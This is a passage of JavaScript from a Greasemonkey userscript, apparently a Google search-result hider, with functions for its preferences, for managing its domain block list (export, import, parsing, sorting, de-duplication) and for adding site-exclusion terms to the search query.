              document.getElementById("ghhMngBtn").parentNode.removeChild(document.getElementById("ghhMngBtn"));
              alert("After you close the management pane, click any block button to open it again.");
              break;
            case "mng":
              if(confirm("Display block buttons only when this dialog is open?")) mbparts[0] = "mng";
              else e.target.checked = false;
              break;
            default:
              mbparts[0] = "both";
              if (!document.getElementById("ghhMngBtn")) addMngBtn();
          }
          mbstyle = mbparts.join("-");
          ghhPrefO.mngbtnstyle[0] = mbstyle;
          GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
          break;
        }
      }
    } else { // Handle Management Button position and block button display style
      var rads = e.target.parentNode.querySelectorAll("input[name='mngbtnpos']");
      for (var i=0; i<rads.length; i++){
        if (rads[i].checked){
          mbparts[2] = rads[i].value;
          mbstyle = mbparts.join("-");
          ghhPrefO.mngbtnstyle[0] = mbstyle;
          GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
          break;
        }
      }
      rads = e.target.parentNode.querySelectorAll("input[name='blockdisp']");
      for (i=0; i<rads.length; i++){
        if (rads[i].checked){
          mbparts[3] = rads[i].value;
          mbstyle = mbparts.join("-");
          ghhPrefO.mngbtnstyle[0] = mbstyle;
          GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
          break;
        }
      }    
      rads = e.target.parentNode.querySelectorAll("input[name='blockttip']");
      for (i=0; i<rads.length; i++){
        if (rads[i].checked){
          mbparts[4] = rads[i].value;
          mbstyle = mbparts.join("-");
          ghhPrefO.mngbtnstyle[0] = mbstyle;
          GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
          break;
        }
      }    
    }
  }
  fixuistyle();
}
function fixuistyle(){  // Check appropriate radio button re buttons to display
  if (mbstyle.split("-").length == 1) mbstyle = mbstyle + "-ifrN-R-P";
  if (mbstyle.split("-").length == 2) mbstyle = mbstyle + "-R-P";
  if (mbstyle.split("-").length == 3) mbstyle = mbstyle + "-P";
  if (mbstyle.split("-").length == 4) mbstyle = mbstyle + "-Y";
  var rads = document.getElementById("btnradios").querySelectorAll("input[name^='uistyle']");
  for (i=0; i<rads.length; i++){
    if (rads[i].value == mbstyle.split("-")[0]){
      rads[i].setAttribute("checked","checked");
      rads[i].checked = true;
    }
    else{
      if (rads[i].hasAttribute("checked")){
        rads[i].removeAttribute("checked");
        rads[i].checked = false;
      }
    }
  }
  var chk = document.getElementById("mbiframe");
  if (mbstyle.split("-")[1] == "ifrY"){
    chk.setAttribute("checked","checked");
    chk.checked = true;
  } else {
    chk.removeAttribute("checked");
    chk.checked = false;  
  }
  var rads = document.getElementById("btnradios").querySelectorAll("input[name^='mngbtnpos']");
  for (i=0; i<rads.length; i++){
    if (rads[i].value == mbstyle.split("-")[2]){
      rads[i].setAttribute("checked","checked");
      rads[i].checked = true;
    }
    else{
      if (rads[i].hasAttribute("checked")){
        rads[i].removeAttribute("checked");
        rads[i].checked = false;
      }
    }
  }
  var rads = document.getElementById("btnradios").querySelectorAll("input[name^='blockdisp']");
  for (i=0; i<rads.length; i++){
    if (rads[i].value == mbstyle.split("-")[3]){
      rads[i].setAttribute("checked","checked");
      rads[i].checked = true;
    }
    else{
      if (rads[i].hasAttribute("checked")){
        rads[i].removeAttribute("checked");
        rads[i].checked = false;
      }
    }
  }
  var rads = document.getElementById("btnradios").querySelectorAll("input[name^='blockttip']");
  for (i=0; i<rads.length; i++){
    if (rads[i].value == mbstyle.split("-")[4]){
      rads[i].setAttribute("checked","checked");
      rads[i].checked = true;
    }
    else{
      if (rads[i].hasAttribute("checked")){
        rads[i].removeAttribute("checked");
        rads[i].checked = false;
      }
    }
  }
}
function updtAJAX(e){ // Store settings for AJAX preferences
  var chk = e.target;
  if (chk.id == "chkajax"){
    if (chk.checked){
      bAJAX = "on";
      if (chgMon) chgMon.disconnect();
      else document.body.removeEventListener("DOMSubtreeModified", checkOlist, false);
      setMutationWatch();
    } else {
      bAJAX = "off";
      if (chgMon) chgMon.disconnect();
      else document.body.removeEventListener("DOMSubtreeModified", checkOlist, false);
    }
  } else {
    if (chk.checked){
      bMutOb = "Y";
      if (!chgMon){
        if (bAJAX){
          document.body.removeEventListener("DOMSubtreeModified", checkOlist, false);
          setMutationWatch();
        }
      }
    } else {
      bMutOb = "N";
      if (chgMon) chgMon.disconnect();
      if (bAJAX){
        document.body.removeEventListener("DOMSubtreeModified", checkOlist, false);
        setMutationWatch();
      }
    }
  }
  ghhPrefO.usemutation[0] = bAJAX + "-" + bMutOb;
  GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
  fixajaxstyle();
}
function fixajaxstyle(){  // Check boxes for AJAX preferences
  var chk = document.getElementById("chkajax");
  if (bAJAX == "on"){
    chk.setAttribute("checked","checked");
    chk.checked = true;
  } else {
    chk.removeAttribute("checked");
    chk.checked = false;  
  }
  var chk = document.getElementById("chkdom4");
  if (bMutOb == "Y"){
    chk.setAttribute("checked","checked");
    chk.checked = true;
  } else {
    chk.removeAttribute("checked");
    chk.checked = false;  
  }
}
function updtpersist(e){ // Store setting for persistence preference
  var chk = e.target;
  if (chk.checked){
    mpopen = "Y" + mpopen.substr(1);
  } else {
    mpopen = "N" + mpopen.substr(1);
  }
  ghhPrefO.mngpaneopen[0] = mpopen;
  GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
  fixpanepersist();
}
function fixpanepersist(){  // Check box for persistence preference
  var chk = document.getElementById("chkmpopen");
  if (mpopen.substr(0,1) == "Y"){
    chk.setAttribute("checked","checked");
    chk.checked = true;
  } else {
    chk.removeAttribute("checked");
    chk.checked = false;  
  }
}
function updt1click(e){ // Store setting for 1-click preferences
  var chk = e.target;
  if (chk.id == "chk1click" || chk.id == "chk1clickbf"){
    if (chk.checked){
      pref1click = "Y" + pref1click.substr(1,2);
    } else {
      pref1click = "N" + pref1click.substr(1,2);
    }
  } else {
    if (chk.checked){
      pref1click = pref1click.substr(0,2) + "Y";
    } else {
      pref1click = pref1click.substr(0,2) + "N";
    }
  }
  ghhPrefO.oneclick[0] = pref1click;
  GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
  e.stopPropagation();
  fix1clickstyle();
}
function fix1clickstyle(){  // Check boxes for one-click preferences
  var chkMP = document.getElementById("chk1click");
  var chkBF = document.getElementById("chk1clickbf");
  if (pref1click.substr(0,1) == "Y"){
    chkMP.setAttribute("checked","checked");
    chkMP.checked = true;
    if (chkBF){
      chkBF.setAttribute("checked","checked");
      chkBF.checked = true;
    }
  } else {
    chkMP.removeAttribute("checked");
    chkMP.checked = false;  
    if (chkBF){
      chkBF.removeAttribute("checked");
      chkBF.checked = false;  
    }
  }
  chk = document.getElementById("chk1pban");
  if (pref1click.substr(2,1) == "Y"){
    chk.setAttribute("checked","checked");
    chk.checked = true;
  } else {
    chk.removeAttribute("checked");
    chk.checked = false;  
  }
}
function updtBeta(e){ // Store setting for runbeta preference
  var chk = e.target;
  if (chk.checked){
    betatest = "Y";
  } else {
    betatest = "N";
  }
  ghhPrefO.runbeta[0] = betatest;
  GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
  fixBeta();
}
function fixBeta(){  // Check box for runbeta preference
  var chk = document.getElementById("chkbeta");
  if (betatest == "Y"){
    chk.setAttribute("checked","checked");
    chk.checked = true;
  } else {
    chk.removeAttribute("checked");
    chk.checked = false;  
  }
}
function chgcaption(e){ // Store button caption changes (but do not immediately refresh)
  var btn, key, input;
  btn = e.target;
  key = e.target.getAttribute("key");
  e.target.blur();
  input = prompt(txts[key][1], txts[key][0]);
  if (!input) return;
  if (input.length > 0 && input != txts[key][0]){
    txts[key][0] = input.replace(/\"/g,"''");
    btn.appendChild(document.createTextNode(txts[key][0]));
    btn.removeChild(btn.firstChild);
    GM_setValue("textstrings",JSON.stringify(txts));
  }
}
function resetTextStrings(e){ // Reset buttons captions to defaults
  if (confirm("Restore default button captions?")){
    txts = defaultTxts;
    GM_setValue("textstrings",JSON.stringify(txts)); // requires Fx 3.5+
    alert("Please reload to see the changes.");
    e.target.blur();
  }
}
function exportlist(e){ // Display and populate export form, clean up from any prior use
  if (!document.getElementById("ghhexport")) insertExportForm();
  var expDiv = document.getElementById("ghhexport");
  document.getElementById("ghheximhead").innerHTML = "Export Block List";
  document.getElementById("ghheximinfo1").innerHTML = "These boxes display your current block list. <br /><br />" +
    "On the left, you have the list in its native format. By saving this format, you can preserve your regular/Perma-ban " + 
    "block decisions. <br /><br />On the right, you have a simple list of domains. " +
    "This would be a good format for sharing your list with others.";
  document.getElementById("ghhtaleft").value = GM_getValue("hideyhosts");
  var domList = GM_getValue("hideyhosts").substr(1).replace(/:[tp]\|/g, "\n");
  document.getElementById("ghhtaright").value = domList.replace(/\n*$/, "");
  document.getElementById("ghhleftcontrols").style.display = "none";
  document.getElementById("ghhrightcontrols").style.display = "none";
  document.getElementById("ghhtbldiv").style.display = "none";
  if (document.getElementById("ghhtaright").style.display == "none") document.getElementById("ghhtaright").style.display = "";
  expDiv.style.display = "block";
  e.target.blur();
}
function insertExportForm(){
  var dNew, btn, par, ta;
  dNew = document.createElement("div");
  dNew.id = "ghhexport";
  dNew.className = "ghhpane";
  dNew.setAttribute("style","position:fixed;top:10%;left:5%;width:90%;z-index:1001;background:#ddd;padding:1em;font-size:1.25em;display:none");
  dNew.innerHTML = "<button onclick=\"this.parentNode.style.display='none'\" style=\"float: right; margin: 0 0 4px 4px;\" class=\"ghhider\">Close</button>" +
  "<p style=\"margin-top:0; font-weight: bold;\" id=\"ghheximhead\"></p>" +
  "<p id=\"ghheximinfo1\"></p>" +
  "<div id=\"ghhleft\" style=\"width:49%;float:left\"><textarea id=\"ghhtaleft\" " +
    "spellcheck=\"false\" style=\"width:100%;height:300px;overflow-y:scroll\"></textarea>" +
    "<div id=\"ghhleftcontrols\" style=\"clear:left;display:none\"><p><button id=\"ghhexp1\">Parse List for Import</button></p></div></div>" +
  "<div id=\"ghhright\" style=\"width:49%;float:right\"><textarea id=\"ghhtaright\" " +
    "spellcheck=\"false\" style=\"width:100%;height:300px;overflow-y:scroll\"></textarea>" +
    "<div id=\"ghhtbldiv\" style=\"height:298px;overflow-y:scroll;overflow-x:scroll;background:#fff;padding:4px 0 0 4px;border:1px solid #aac;margin-top:1px;display:none\"></div> " +
    "<div id=\"ghhrightcontrols\" style=\"clear:right;display:none\"><p id=\"impradios\">Please review the above list for accuracy. If correct, add domains to: <br>" +
    "<label><input type=\"radio\" name=\"impbtype\" value=\"asis\">&nbsp;the list specified under Block Type</label> <br />" +
    "<label><input type=\"radio\" name=\"impbtype\" value=\"t\">&nbsp;the regular block list</label> <br />" +
    "<label><input type=\"radio\" name=\"impbtype\" value=\"p\">&nbsp;the Perma-ban list</label> &nbsp; " +
    "<button id=\"ghhexp2\">Import</button></p></div></div>";
  document.body.appendChild(dNew);
}
function importlist(e){ // Display import form, clean up from any prior use
  if (!document.getElementById("ghhexport")) insertExportForm();
  var expDiv = document.getElementById("ghhexport");
  document.getElementById("ghheximhead").innerHTML = "Import Block List";
  document.getElementById("ghheximinfo1").innerHTML = "<strong>As a precaution in case something goes wrong, please use the Export feature to copy " +
    "and save your current list as a backup.</strong> <br /><br />" +
    "To begin, paste your list into the left box below. Then click the Parse List for Import button. This script can import a list in its own native format, or a plain list of domains with a separate domain on each line, or " +
    "separated by spaces. (It also converts the Noise Reduction for Google and Google Domain Blocker formats.)";
  document.getElementById("ghhtaleft").value = "";
  document.getElementById("ghhleftcontrols").style.display = "";
  document.getElementById("ghhexp1").addEventListener("click",parseList,true);
  document.getElementById("ghhtaright").style.display = "none";
  document.getElementById("ghhtbldiv").style.display = "none";
  expDiv.style.display = "block";
  e.target.blur();
}
function parseList(e){  // Parse putative domain list and redisplay cleaned up
  var txt, sites = [], bHasTypes = 0, i, tbod, thd, rasis, lbpos, rbpos;
  txt = document.getElementById("ghhtaleft").value;
  if (txt.length < 4){
    alert("Block list too short!");
    return;
  }
  document.getElementById("ghhtbldiv").innerHTML = "";
  // clean up/convert domain list to pipe-delimited
  txt = txt.replace(/(http|https):/g, "");
  txt = txt.replace(/(,|\/|;)/g, "|");
  txt = txt.replace(/\s+/g, "|");
  txt = txt.replace(/\|+/g, "|");
  txt = txt.replace(/[\<\>"'=#\!\u2018\u2019\(\)\{\}]/g, "");
  // strip regex
  txt = txt.replace(/(\+|\*|\$|\\)/g, "");
  while (txt.indexOf("[") > -1 && txt.indexOf("]") > -1){
    lbpos = txt.indexOf("[");
    rbpos = txt.indexOf("]")
    if (lbpos > 0 && rbpos + 1 < txt.length) txt = txt.substring(0,lbpos) + txt.substring(rbpos+1);
    else {
      if (lbpos == 0 && rbpos + 1 < txt.length) txt = txt.substring(rbpos+1);
      else break; // for some reason, entire list is bracketed??
    }
  }
  if (txt.indexOf(":") > -1) bHasTypes = 1;
  sites = txt.split("|");
  for (i=0; i<sites.length; i++){
    if (sites[i].length > 1){
      if (sites[i].indexOf(".") == 0) sites[i] = sites[i].substr(1);
      if (sites[i].indexOf("?") > -1) sites[i] = sites[i].substr(0,sites[i].indexOf("?"));
      if (bHasTypes == 1){
        if (sites[i].indexOf(":t") == sites[i].length - 2 || sites[i].indexOf(":p") == sites[i].length - 2){
          sites[i] = "<tr><td>" + sites[i].replace(":t","</td><td>regular").replace(":p","</td><td>Perma-ban") + "</td></tr>";
        } else {
          if (sites[i].indexOf(":") > -1) sites[i] = sites[i].substr(0, sites[i].indexOf(":")); 
          sites[i] = "<tr><td>" + sites[i] + "</td><td>(unspecified)</td></tr>";
        }
      } else { // Plain list
        sites[i] = "<tr><td>" + sites[i] + "</td></tr>";
      }
    }
  }
  tbod = "<tbody>\n" + sites.join("\n") + "</tbody>";
  if (sites.length == 0){
    alert("Unable to parse the list, sorry."); return;
  }
  if (bHasTypes == 1) thd  = "<thead><tr><th>Domain</th><th>Block Type</th></tr></thead>";
  else thd  = "<thead><tr><th>Domain</th></tr></thead>";
  document.getElementById("ghhtbldiv").innerHTML = "<table cellspacing=\"0\" class=\"ghhtbl\" id=\"ghhparsed\">" + thd + tbod + "</table>";
  document.getElementById("ghhtbldiv").style.display = "";
  rasis = document.getElementById("ghhrightcontrols").querySelectorAll("input[value='asis']")[0];
  if (bHasTypes == 1){
    if (rasis.hasAttribute("disabled")) rasis.removeAttribute("disabled");
    rasis.checked = true;
    rasis.parentNode.style.color = "";
  } else {
    rasis.setAttribute("disabled","disabled");
    rasis.parentNode.style.color = "rgb(172, 168, 153)";
    document.getElementById("ghhrightcontrols").querySelectorAll("input[value='t']")[0].checked = true;
  } 
  document.getElementById("ghhrightcontrols").style.display = "block";
  document.getElementById("ghhexp2").addEventListener("click",doImport,true);
  e.target.blur();
}
function doImport(e){ // Add sites from cleaned up domain list to script block lists
  var tbl, rads, i, typeRule, rows, dom, newDoms = "";
  tbl = document.getElementById("ghhparsed");
  if (!tbl){
    alert("Unable to locate table of parsed domains!");
    return;
  }
  if (tbl.parentNode.style.display == "none"){
    alert("Please start the import process again!");
    return;
  }
  rads = document.getElementById("ghhrightcontrols").querySelectorAll("input[type='radio']");
  for (i=0; i<rads.length; i++){
    if (rads[i].checked){
      typeRule = rads[i].value;
      break;
    }
  }
  rows = tbl.getElementsByTagName("tbody")[0].getElementsByTagName("tr");
  for (i=0; i<rows.length; i++){
    dom = rows[i].children[0].textContent;
    if (dom.lastIndexOf(".") < dom.length-2 && dom.indexOf(".") > 1){
      switch (typeRule){
        case "asis":
          if (rows[i].children[1].textContent == "Perma-ban") newDoms += dom + ":p|";
          else newDoms += dom + ":t|";
          break;
        default:
          newDoms += dom + ":" + typeRule + "|";
      }
      rows[i].style.backgroundColor = "#ff0";
    } else {
      rows[i].style.backgroundColor = "#f00";
    }
  }
  if (newDoms != ""){
    if (blist == "") blist = "|" + newDoms;
    else blist += newDoms;
    GM_setValue("hideyback",GM_getValue("hideyhosts"));
    GM_setValue("hideyhosts",blist);
    if(document.getElementById("ghhmngform").style.display=="block") refreshSiteList();
  }
  alert("Import of yellow-highlighted domains completed. Please check the Management Pane to " +
    "view, sort, and/or de-duplicate your imported domains.");
}
function sortlist(e){ // Alpha-sort block list
  if (listchgs > 0) {
    if (confirm("You have unsaved changes to your lists. Save changes and sort, or cancel sorting?")){
      saveedits(null);
    } else {
      return;
    }
  }
  if (blist.substr(0,1) != "|") blist = "|" + blist;
  var sarray = blist.substr(1,blist.length-2).split("|");
  sarray.sort();
  GM_setValue("hideyhosts", "|" + sarray.join("|") + "|");
  blist = GM_getValue("hideyhosts");
  refreshSiteList();
  if (e) e.target.blur();
}
function dedup(e){  // De-duplicate block lists
  if (!confirm("If you block example.com, you don't also need to block www.example.com. Remove unnecessary domains from the block list?")) return;
  var barray, i, j, iadd, smain, stest, sremd = "", sques = "";
  if (blist.substr(0,1) != "|") blist = "|" + blist;
  barray = blist.substr(1,blist.length-2).split("|");
  for (i=0; i<barray.length; i++){
    if (barray[i].indexOf(":t") > -1){
      barray[i] = barray[i].substr(0,barray[i].indexOf(":")).split(".").reverse().join(".") + "!t"; 
    } else {
      if (barray[i].indexOf(":p") > -1){
        barray[i] = barray[i].substr(0,barray[i].indexOf(":")).split(".").reverse().join(".") + "!p"; 
      } else {
        barray[i] = barray[i].split(".").reverse().join(".") + "!t";
      }
    }
  }
  barray.sort();
  for (i=0; i<barray.length-1; i++){
    iadd = 0;
    for (j=1; j<barray.length-i; j++){
      if (barray[i+j].indexOf(barray[i].substr(0,barray[i].length-2)) != 0) break;
      smain = barray[i].substr(0,barray[i].length-2).split(".").reverse().join(".");
      stest = barray[i+j].substr(0,barray[i+j].length-2).split(".").reverse().join(".");
      if (stest.indexOf(smain) < 0) break;
      if (barray[i].substr(barray[i].length-1) == barray[i+j].substr(barray[i+j].length-1)){
        blist = blist.replace(stest + ":" + barray[i+j].substr(barray[i+j].length-1) + "|", "");
        sremd += "|Removed: " + stest + "; Covered by: " + smain;
        iadd += 1;
      } else {
        stest += (barray[i+j].substr(barray[i+j].length-1) == "t") ? " (regular)" : " (permaban)";
        smain += (barray[i].substr(barray[i].length-1) == "t") ? " (regular)" : " (permaban)";
        sques += "|Didn't remove " + stest + " due to block type difference from " + smain;
      }
    }
    i += iadd;
  }
  GM_setValue("hideyhosts",blist);
  refreshSiteList();
  // ToDo: Alerts are temporary; nicer display "some day"
  if (sremd != "") alert(sremd.substr(1).replace(/\|/g,"\n"));
  if (sques != "") alert(sques.substr(1).replace(/\|/g,"\n"));
  if (sremd == "" && sques == "") alert("No unnecessary domains found.");
  if (e) e.target.blur();
}
function unwww(e){  // Remove www from beginnings of domains
  if (!confirm("You can block other subdomains on example.com by removing www from the beginning (e.g., blog.example.com). Update the block list?")) return;
  if (blist.substr(0,1) != "|") blist = "|" + blist;
  blist = blist.replace(/\|www\./g, "\|");
  GM_setValue("hideyhosts",blist);
  refreshSiteList();
  if (e) e.target.blur();
}
// Misc functions
function convertFormat(){
  if (blist.substr(0,1) != "|") blist = "|" + blist;
  blist = "|" + blist.slice(1).replace(/\|/g,":t|");
  GM_setValue("hideyhosts", blist);
}
function convertTxts(strTxts){
  var oldTxts;
  oldTxts = JSON.parse(strTxts);
  txts = defaultTxts;
  if (txtsPref.indexOf(":[") == -1){  // 0.8x to 0.9x+
    txts.block[0] = oldTxts.block;
    txts.unblock[0] = oldTxts.unblock;
    txts.pban[0] = oldTxts.pban;
    txts.okbtn[0] = oldTxts.okbtn;
    txts.cancelbtn[0] = oldTxts.cancelbtn;
    txts.savebtn[0] = oldTxts.savebtn;
    txts.closebtn[0] = oldTxts.closebtn;  
  } else {  // 0.9x to 1.1x+
    txts.block[0] = oldTxts.block[0];
    txts.unblock[0] = oldTxts.unblock[0];
    txts.pban[0] = oldTxts.pban[0];
    txts.okbtn[0] = oldTxts.okbtn[0];
    txts.cancelbtn[0] = oldTxts.cancelbtn[0];
    txts.savebtn[0] = oldTxts.savebtn[0];
    txts.closebtn[0] = oldTxts.closebtn[0];
    if (oldTxts.okPbtn) txts.okPbtn[0] = oldTxts.okPbtn[0];
    if (oldTxts.cancelMbtn) txts.cancelMbtn[0] = oldTxts.cancelMbtn[0];
    if (oldTxts.mngbtn) txts.mngbtn[0] = oldTxts.mngbtn[0];
    if (txts.savebtn[0]=="Save Changes") txts.savebtn[0]="Save Lists"; // v1.1
    // 1.1 to 1.2+
    if (oldTxts.eximbtn) txts.eximbtn[0] = oldTxts.eximbtn[0];
    // 1.2 to 1.3+
    if (oldTxts.utilbtn) txts.utilbtn[0] = oldTxts.utilbtn[0];
    if (oldTxts.sortbtn) txts.sortbtn[0] = oldTxts.sortbtn[0];
    if (oldTxts.unwwwbtn) txts.unwwwbtn[0] = oldTxts.unwwwbtn[0];
    if (oldTxts.dedupbtn) txts.dedupbtn[0] = oldTxts.dedupbtn[0];
  }
  GM_setValue("textstrings",JSON.stringify(txts)); // requires Fx 3.5+
}
function ghhkillevent(e){
  if (e.currentTarget.nodeName == "BUTTON" || e.currentTarget.nodeName == "INPUT") return;
  e.stopPropagation();
}
function toggleBlockHiders(str){
  var s = document.getElementById("ghhStyleNoBlock");
  if (str == "S"){
    if (s) s.parentNode.removeChild(s);
    return;
  }
  if (str == "H"){
    if (s) return;
    s = document.createElement("style");
    s.id = "ghhStyleNoBlock";
    s.setAttribute("type", "text/css");
    s.appendChild(document.createTextNode(".ghhb{display:none}"));
    document.body.appendChild(s);
  }
}
function refreshListeners(e){ // for AutoPager extension
  var bbtns, bnotc, i, j;
  bbtns = document.getElementById("navcnt").querySelectorAll(".ghhb");
  for (i=0;i<bbtns.length;i++){
    bbtns[i].removeEventListener("click",showbfd,true);
    bbtns[i].addEventListener("click",showbfd,true);
  }
  bnotc = document.getElementById("navcnt").querySelectorAll(".ghhd");
  for (i=0;i<bnotc.length;i++){
    bnotc[i].removeEventListener("click",reshow,true);
    bnotc[i].addEventListener("click",reshow,true);
    bbtns = bnotc[i].querySelectorAll("button.ghhider");
    for (j=0;j<bbtns.length;j++){
      if (bbtns[j].getAttribute("title")=="Unblock this site"){
        bbtns[j].removeEventListener("click",unblock,true);
        bbtns[j].addEventListener("click",unblock,true);
      }
      if (bbtns[j].getAttribute("title")=="Permanently hide this site"){
        bbtns[j].removeEventListener("click",permban,true);
        bbtns[j].addEventListener("click",permban,true);
      }
      if (bbtns[j].getAttribute("title")=="Re-hide this hit"){
        bbtns[j].removeEventListener("click",rehide,true);
        bbtns[j].addEventListener("click",rehide,true);
      }
    }
  }
}
function convertPrefs(arrPrefs, allnew){
  ghhPrefO = arrPrefs;
  if (allnew == "true"){  // 1.3.7 to 1.4.x
    var tmp = GM_getValue("shownotc");
    if (tmp){
      if (tmp.length > 0) ghhPrefO.shownotc[0] = tmp;
      GM_deleteValue("shownotc");
    }
    tmp = GM_getValue("mngpaneopen");
    if (tmp){
      if (tmp.length > 0) ghhPrefO.mngpaneopen[0] = tmp;
      GM_deleteValue("mngpaneopen");
    }
    tmp = GM_getValue("mngbtnstyle");
    if (tmp) if (tmp.length > 0){
      if (tmp.indexOf("-")>-1) tmp = "both"; // default ancient pref
      ghhPrefO.mngbtnstyle[0] = tmp;
      GM_deleteValue("mngbtnstyle");
    }
    tmp = GM_getValue("addtolistpos");
    if (tmp){
      if (tmp.length > 0) ghhPrefO.addtolistpos[0] = tmp;
      GM_deleteValue("addtolistpos");
    }
    tmp = GM_getValue("aggressiveblock");
    if (tmp){
      if (tmp.length > 0) ghhPrefO.aggressiveblock[0] = tmp;
      GM_deleteValue("aggressiveblock");
    }
    tmp = GM_getValue("usemutation");
    if (tmp){
      if (tmp.length > 0) ghhPrefO.usemutation[0] = tmp;
      GM_deleteValue("usemutation");
    }
  } else {
    if (ghhPrefs.indexOf("reserved1")>-1){
      var oldPrefs = JSON.parse(ghhPrefs);
      ghhPrefO.shownotc[0] = oldPrefs.shownotc[0];
      ghhPrefO.mngpaneopen[0] = oldPrefs.mngpaneopen[0];
      ghhPrefO.mngbtnstyle[0] = oldPrefs.mngbtnstyle[0];
      ghhPrefO.addtolistpos[0] = oldPrefs.addtolistpos[0];
      ghhPrefO.aggressiveblock[0] = oldPrefs.aggressiveblock[0];
      ghhPrefO.usemutation[0] = oldPrefs.usemutation[0];
      ghhPrefO.oneclick[0] = oldPrefs.oneclick[0];
    }
  }
  GM_setValue("ghhprefs",JSON.stringify(ghhPrefO)); // requires Fx 3.5+
}
function togglebbtn(e){
  var bbtn = e.currentTarget.querySelector('.ghhb');
  if (bbtn){
    if (e.type == "mouseover") bbtn.style.visibility = "";
    else bbtn.style.visibility = "hidden";
  }
}
function reQuery(e){
  var ss, rads, i;
  if (e){
    if (e.target.id == "ghhbf5") ss = "+site:"; 
    else ss = "+-site:";
    rads = e.target.form.querySelectorAll('input[type="radio"]');
  } else {
    ss = "+-site:"; // ALT omit
    rads = document.querySelector('#ghhblockform form').querySelectorAll('input[type="radio"]');
  }
  if (rads.length > 0){
    for (var i=0; i<rads.length; i++){
      if(rads[i].checked){
        ss += rads[i].nextElementSibling.textContent;
        reQry(ss);
        break;
      }
    }
  } else GM_log("reQuery fail: no rads");
}
function reQry(d){
  if (!d) return;
  var qsp = window.location.href.indexOf("?");
  if (qsp < 0) return;
  var q = window.location.href.substr(qsp+1);
  if (d.substr(0,2) == "+-" && (q.indexOf(d+"%20")>-1 || q.indexOf(d+"&")>-1)) return; // try to block dups, may be overinclusive
  var qa = q.split("&");
  var has_q = false
  for (var j=qa.length-1; j>=0; j--){
    if (qa[j].split("=")[0] == "q"){
      qa[j] += d;
      has_q = true;
      break;
    } else {
      if (qa[j].indexOf("#q=") > -1){
        qa[j] += d;
        has_q = true;
        break;
      }
    }
  }
  if (has_q) window.location.href = window.location.href.substr(0, window.location.href.indexOf("?")+1) + qa.join("&");
  else GM_log("Unable to add new search term to URL");
}